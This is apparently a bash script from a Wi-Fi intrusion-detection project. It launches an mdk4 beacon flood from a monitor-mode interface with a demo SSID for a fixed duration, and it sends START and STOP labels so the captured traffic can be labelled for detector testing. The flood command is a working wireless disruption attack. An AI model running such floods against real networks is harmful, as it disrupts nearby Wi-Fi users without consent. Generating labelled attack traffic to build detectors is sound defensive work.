#!/usr/bin/env bash
# Beacon flood + labeling (Kali / monitor mode). SMOKE ONLY — not a new train baseline.
# Usage: sudo -E ./host/attacks/attack_beacon_flood.sh
#
# Needs mdk4. Quiet RF is OK for this smoke: we only check beacon_packets / BEACON
# subtype rises vs IDLE. Do not add unique_bssid as an absolute board feature today.
set -euo pipefail
DIR="$(cd "$(dirname "$0")" && pwd)"
# shellcheck source=netconfig.sh
source "${DIR}/netconfig.sh"

LABEL_SENT=0
_cleanup_label() {
  if [[ "${LABEL_SENT}" -eq 1 ]]; then
    echo ">>> cleanup: sending STOP BEACON_FLOOD" >&2
    send_label STOP BEACON_FLOOD || true
    LABEL_SENT=0
  fi
}
trap _cleanup_label EXIT

if ! command -v mdk4 >/dev/null 2>&1; then
  echo ">>> ERROR: mdk4 not found. apt install mdk4" >&2
  exit 1
fi

if ! ip link show "$MON_IFACE" >/dev/null 2>&1; then
  _alt="$(iw dev 2>/dev/null | awk '/^[[:space:]]*Interface /{iface=$2} /^[[:space:]]*type monitor/{print iface; exit}')"
  if [[ -n "${_alt:-}" ]]; then
    MON_IFACE="$_alt"
    export NIDS_MON_IFACE="$_alt"
  else
    bash "${DIR}/prepare_wifi.sh" monitor
    MON_IFACE="${NIDS_MON_IFACE:-$MON_IFACE}"
  fi
fi
if ! ip link show "$MON_IFACE" >/dev/null 2>&1; then
  echo ">>> ERROR: no monitor iface" >&2
  exit 1
fi

ensure_label_path || exit 1

BSSID="${NIDS_BSSID:-$(_json_field ap_bssid 2>/dev/null || true)}"
CHANNEL="${NIDS_WIFI_CHANNEL:-$(_json_field channel 2>/dev/null || true)}"
DURATION="${NIDS_BEACON_FLOOD_SEC:-45}"
BEACON_SSID="${NIDS_BEACON_SSID:-NIDS-DEMO-BEACON}"

[[ "$CHANNEL" =~ ^([1-9]|1[0-3])$ ]] || {
  echo '>>> ERROR: set NIDS_WIFI_CHANNEL to the authorized 2.4 GHz demo AP channel (1..13)' >&2
  exit 1
}

if [[ -n "${CHANNEL:-}" && "$CHANNEL" != "null" && "$CHANNEL" != "0" ]]; then
  iw dev "$MON_IFACE" set channel "$CHANNEL" 2>/dev/null \
    || iwconfig "$MON_IFACE" channel "$CHANNEL" 2>/dev/null || {
      echo '>>> ERROR: could not set demo channel; check monitor mode' >&2
      exit 1
    }
fi

echo ">>> Monitor iface    : $MON_IFACE"
echo ">>> AP BSSID (opt)   : ${BSSID:-none}"
echo ">>> Channel          : ${CHANNEL:-?}"
echo ">>> Duration         : ${DURATION}s"
echo ">>> Demo beacon SSID : ${BEACON_SSID}"
echo ">>> Label host       : $(get_label_host):${LABEL_PORT}"
echo ">>> READY FOR BEACON_FLOOD"

send_label START BEACON_FLOOD
LABEL_SENT=1
sleep 0.5

set +e
# In mdk4 beacon mode, -a enables malformed SSIDs; it takes no BSSID.
# Use a distinct demo SSID so this test does not also impersonate the real AP.
timeout "$DURATION" mdk4 "$MON_IFACE" b -n "$BEACON_SSID" -c "$CHANNEL"
rc=$?
set -e
echo ">>> mdk4 finished rc=${rc} (124=timeout/duration OK)"

sleep 1
send_label STOP BEACON_FLOOD
LABEL_SENT=0
if [[ "$rc" -ne 124 && "$rc" -ne 0 ]]; then
  echo ">>> ERROR: mdk4 exited unexpectedly (rc=${rc}); do not use this run as a valid attack" >&2
  exit "$rc"
fi
echo " >>> BEACON_FLOOD FINISHED"
echo " >>> Next: sudo -E ./host/attacks/prepare_wifi.sh managed"
